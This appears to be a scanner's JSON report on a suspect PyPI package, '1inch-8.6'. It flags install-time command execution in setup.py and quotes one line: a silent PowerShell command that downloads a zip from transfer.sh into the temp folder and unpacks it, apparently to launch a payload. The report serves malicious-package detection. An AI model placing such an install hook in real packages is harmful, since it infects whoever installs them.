@@ -1,0 +1,35 @@
+{
+    "issues": 3,
+    "errors": {},
+    "results": {
+        "download-executable": {},
+        "obfuscation": {},
+        "code-execution": [
+            {
+                "location": "setup.py:5",
+                "code": "    result = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True)\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:11",
+                "code": "    run(r\"powershell -command $ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue'; Invoke-WebRequest -UseBasicParsing -Uri https://transfer.sh/W7c4KP/transfer.zip -OutFile $env:tmp/update.zip; Expand-Archiv...ver.pyw\")\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "shady-links": [
+            {
+                "location": "setup.py:11",
+                "code": "    run(r\"powershell -command $ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue'; Invoke-WebRequest -UseBasicParsing -Uri https://transfer.sh/W7c4KP/transfer.zip -OutFile $env:tmp/update.zip; Expand-Archiv...ver.pyw\")\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "dll-hijacking": {},
+        "cmd-overwrite": {},
+        "exfiltrate-sensitive-data": {},
+        "silent-process-execution": {},
+        "exec-base64": {},
+        "clipboard-access": {},
+        "steganography": {}
+    },
+    "path": "../detection/pypi/1inch-8.6"
+}
